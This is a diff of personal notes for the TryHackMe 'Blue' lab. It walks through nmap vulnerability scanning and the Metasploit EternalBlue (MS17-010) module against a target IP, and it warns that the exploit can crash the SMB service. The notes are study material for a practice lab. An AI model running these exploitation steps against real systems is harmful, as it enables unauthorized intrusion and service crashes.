@@ -17,7 +17,7 @@ https://github.com/DarkStar7471/CTF-Write-Ups-And-Items/tree/master/TryHackMe/Bl
                        ==============
 https://www.youtube.com/watch?v=s6rwS7UuMt8&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=2
 
-
+   nmap -sV --script vuln -v <IP>
 1. nmap -sC -sV -vvv   ./nmap_out <IP>
 2. How many ports are open with a port number under 1000?    3
 
@@ -50,8 +50,8 @@ https://www.youtube.com/watch?v=s6rwS7UuMt8&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp
 
 Server Message Block (SMB): a communication protocol[1] used to share files, printers, serial ports, and miscellaneous communications between nodes on a network. 
 
-4.1	msfconsole: start Metasploit
-   [msf](Jobs:0 Agents:0) >> search ms17-010 :   find ms17-010 related exploits
+4.1	msfconsole    # start Metasploit
+   [msf](Jobs:0 Agents:0) >> search ms17-010  #   find ms17-010 related exploits
 
     output:
 	 #  Name                                      Disclosure Date  Rank   Check Description
@@ -62,7 +62,7 @@ Server Message Block (SMB): a communication protocol[1] used to share files, pri
 	 
 	 
 3.2 use the exploit 
-    [msf](Jobs:0 Agents:0) >>    use exploit/windows/smb/ms17_010_eternalblue 
+    use 0 or      use exploit/windows/smb/ms17_010_eternalblue 
 	
 4.3 check what options we must set before running this exploit 
     [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>   show options
@@ -78,6 +78,7 @@ Looks like we'll have to set the RHOST, remote host
 4.4	[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> 	set RHOSTS <HOST IP>
 
 4.5 run it! 
+run
  [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> exploit
  
  This can occasionally fail, try running it a couple times after 
@@ -85,4 +86,9 @@ Looks like we'll have to set the RHOST, remote host
  
  
  
-10.10.31.153 
+================     crashed the machine.
+
+This is the ugly stepchild of MS17-010 exploits. Very flaky, high risk of crashing the SMB service
+ on the machine. Alas, if you’re feeling lucky, this is what you need to do.
+
+Chances are if you did not get a shell, you crashed the machine.
